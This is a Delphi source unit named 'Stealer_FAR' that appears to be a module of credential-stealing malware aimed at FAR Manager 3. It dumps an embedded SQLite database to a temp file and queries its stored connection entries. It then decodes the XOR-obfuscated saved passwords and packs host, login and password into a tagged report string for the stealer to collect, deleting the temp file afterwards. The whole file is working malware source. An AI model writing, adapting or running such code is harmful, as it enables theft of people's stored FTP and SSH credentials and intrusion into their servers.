unit Stealer_FAR;

interface

uses
  Sysutils,Windows,Classes;

var
  far3rez,ghost,glogin,gpwd:AnsiString;

function FAR3_ProcessDB(M: dword; size: dword): String;

implementation

{$R .\EmbeddedSQLite3\resource\sqlite3dll32.res}

uses SQLite3Lib, Parser;

function far3_decode_pwd(host,login,encpwd:AnsiString):AnsiString;
var
  i:integer;
  pwd,ass,lhp:ansistring;
  a:ansichar;
  xorb:byte;
  apos,llhp:integer;
begin
  result:='';
  ass:='';
  //setlength(ass,length(encpwd) div 2);
  if (length(encpwd) div 2)<=3 then exit;
  xorb:=strtoint('$'+copy(encpwd,3,2));
  llhp:=strtoint('$'+copy(encpwd,5,2)) xor xorb;
  for i:=1 to (length(encpwd) div 2) do
  begin
    a:=ansichar(strtoint('$'+copy(encpwd,(i-1)*2+1,2)) xor xorb);
    ass:=ass+a;
  end;
  setlength(ass,length(encpwd) div 2);
  apos:=AnsiPos(login,ass);
  if apos<>0 then
  begin
    lhp:=copy(ass,apos,llhp);
    pwd:=copy(lhp,ansipos(host,lhp)+length(host),length(lhp)-ansipos(host,lhp));
    result:=pwd;
  end;

end;

function mycallback(UserData: Pointer; NumCols: integer;
    ColValues: PUTF8CharArray; ColNames: PUTF8CharArray): integer; cdecl;
var
  i:integer;
  sVal, sName : AnsiString;
begin
   Result := 0;
         if NumCols > 0 then
         begin
            for i := 0 to NumCols - 1 do
            begin
              sName := ColNames[i];
              sVal  := ColValues[i];
              if (sval='HostName') then
              begin
                if (i+1)<NumCols then
                begin
                  ghost:=ColValues[i+1];
                end;
              end
              else if (sval='UserName') then
              begin
                if (i+1)<NumCols then
                begin
                  glogin:=ColValues[i+1];
                end;
              end
              else if (sval='Password') then
              begin
                if (i+1)<NumCols then
                begin
                  gpwd:=far3_decode_pwd(ghost,glogin,ColValues[i+1]);
                  far3rez:=far3rez+formattype(REPORT_DATA_HOST)+ghost+#13#10;
                  far3rez:=far3rez+formattype(REPORT_DATA_LOGIN)+glogin+#13#10;
                  far3rez:=far3rez+formattype(REPORT_DATA_PWD)+gpwd+#13#10;
                end;
              end;

            end;

         end;
end;

function FAR3_ProcessDB(M: dword; size: dword): String;
var
  db:psqlite3;
  errormsg:Pansichar;
  TempFile: array[0..MAX_PATH - 1] of Char;
  TempPath: array[0..MAX_PATH - 1] of Char;
  FS: TFileStream;
begin
  far3rez:='';
  errormsg:='';
  if SQLite3Lib.DoInitialize then
  begin
    // write db to file in temp
    GetTempPath(MAX_PATH, TempPath);
    GetTempFileName(TempPath, PChar('u3far3'), 0, TempFile);
    FS:=nil;
    FS := TFileStream.Create(TempFile,fmOpenReadWrite);
    FS.Write(pointer(M)^,size);
    FS.Free;

    SQLite3Lib.sqlite3_open16(TempFile,db);
    SQLite3Lib.sqlite3_exec(db,pansichar('SELECT * FROM table_values'),@mycallback,nil,errormsg);
    SQLite3Lib.sqlite3_close(db);
    SQLite3Lib.DoFinalize;

    DeleteFile(TempFile);
  end;
  result:=far3rez;
end;

end.
